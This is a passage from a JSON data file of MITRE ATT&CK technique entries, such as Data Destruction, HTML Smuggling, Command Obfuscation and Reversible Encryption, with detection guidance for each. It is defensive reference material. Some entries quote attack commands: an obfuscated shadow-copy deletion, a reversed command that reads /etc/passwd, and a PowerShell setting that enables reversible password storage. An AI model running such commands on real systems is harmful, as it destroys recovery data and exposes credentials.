      "description": "Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1200",
      "stix_id": "attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:59:11.434000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Drive: Drive Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \n\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports."
    },
    "T1219.002": {
      "id": "T1219.002",
      "name": "Remote Desktop Software",
      "description": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) \n \nRemote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome\u2019s Remote Desktop.(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop) ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1219.002",
      "stix_id": "attack-pattern--d4287702-e2f7-4946-bdfa-2c7f5aaa5032",
      "created": "2025-03-24T22:24:47.684000+00:00",
      "modified": "2025-04-16T16:42:15.226000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1505": {
      "id": "T1505",
      "name": "Server Software Component",
      "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505",
      "stix_id": "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb",
      "created": "2019-06-28T17:52:07.296000+00:00",
      "modified": "2025-04-16T20:37:21.713000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "File: File Modification",
        "File: File Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) "
    },
    "T1485": {
      "id": "T1485",
      "name": "Data Destruction",
      "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1485",
      "stix_id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
      "created": "2019-03-14T18:47:17.701000+00:00",
      "modified": "2025-04-15T19:59:11.731000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Snapshot: Snapshot Deletion",
        "Cloud Storage: Cloud Storage Modification",
        "Process: Process Creation",
        "File: File Deletion",
        "Image: Image Deletion",
        "Instance: Instance Deletion",
        "File: File Modification",
        "Volume: Volume Deletion",
        "Cloud Storage: Cloud Storage Deletion",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity."
    },
    "T1132.002": {
      "id": "T1132.002",
      "name": "Non-Standard Encoding",
      "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1132.002",
      "stix_id": "attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc",
      "created": "2020-03-14T23:39:50.117000+00:00",
      "modified": "2025-04-25T14:48:12.613000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1556.001": {
      "id": "T1556.001",
      "name": "Domain Controller Authentication",
      "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.001",
      "stix_id": "attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605",
      "created": "2020-02-11T19:05:02.399000+00:00",
      "modified": "2025-04-15T22:21:45.658000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Process: Process Access",
        "File: File Modification",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). "
    },
    "T1537": {
      "id": "T1537",
      "name": "Transfer Data to Cloud Account",
      "description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1537",
      "stix_id": "attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6",
      "created": "2019-08-30T13:03:04.038000+00:00",
      "modified": "2025-04-15T23:16:36.472000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Storage: Cloud Storage Modification",
        "Snapshot: Snapshot Creation",
        "Snapshot: Snapshot Modification",
        "Cloud Storage: Cloud Storage Metadata",
        "Snapshot: Snapshot Metadata",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content",
        "Cloud Storage: Cloud Storage Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. \n\nIn AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs.(Citation: AWS EBS Snapshot Sharing) Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a \"Get Snapshot SAS URL\" event in Activity Logs.(Citation: Azure Blob Snapshots)(Citation: Azure Shared Access Signature)"
    },
    "T1027.006": {
      "id": "T1027.006",
      "name": "HTML Smuggling",
      "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.006",
      "stix_id": "attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb",
      "created": "2021-05-20T12:20:42.219000+00:00",
      "modified": "2025-04-15T19:59:12.085000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging.(Citation: Outlflank HTML Smuggling 2018) Detecting specific JavaScript and/or HTML5 attribute strings such as <code>Blob</code>, <code>msSaveOrOpenBlob</code>, and/or <code>download</code> may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.\n\nConsider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities."
    },
    "T1556.005": {
      "id": "T1556.005",
      "name": "Reversible Encryption",
      "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.005",
      "stix_id": "attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48",
      "created": "2022-01-13T20:02:28.349000+00:00",
      "modified": "2025-04-15T23:00:34.242000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "Command: Command Execution",
        "User Account: User Account Metadata",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor property changes in Group Policy: <code>Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. \n\nMonitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)"
    },
    "T1027.010": {
      "id": "T1027.010",
      "name": "Command Obfuscation",
      "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.010",
      "stix_id": "attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377",
      "created": "2023-03-14T17:36:01.022000+00:00",
      "modified": "2025-04-15T22:06:13.992000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Script: Script Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1070.004": {
      "id": "T1070.004",
      "name": "File Deletion",
      "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.004",
      "stix_id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
      "created": "2020-01-31T12:35:36.479000+00:00",
      "modified": "2025-04-15T19:59:12.733000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Deletion"
      ],
      "defense_bypassed": [],
      "detection": "It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe."
    },
    "T1189": {
      "id": "T1189",
      "name": "Drive-by Compromise",
      "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:\n\n* A legitimate website is compromised, allowing adversaries to inject malicious code\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)\n\nBrowser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1189",
      "stix_id": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:59:12.900000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "File: File Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system."
    },
    "T1498": {
      "id": "T1498",
      "name": "Network Denial of Service",
      "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1498",
      "stix_id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
      "created": "2019-04-17T20:23:15.105000+00:00",
      "modified": "2025-04-15T22:51:06.430000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation."
    },
    "T1651": {
      "id": "T1651",
      "name": "Cloud Administration Command",
      "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1651",
      "stix_id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
      "created": "2023-03-13T15:26:11.741000+00:00",
      "modified": "2025-04-15T19:59:13.081000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1546.016": {
      "id": "T1546.016",
      "name": "Installer Packages",
      "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.016",
      "stix_id": "attack-pattern--da051493-ae9c-4b1b-9760-c009c46c9b56",
      "created": "2022-09-27T18:02:16.026000+00:00",
      "modified": "2025-04-15T19:59:13.167000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1595.001": {
      "id": "T1595.001",
      "name": "Scanning IP Blocks",
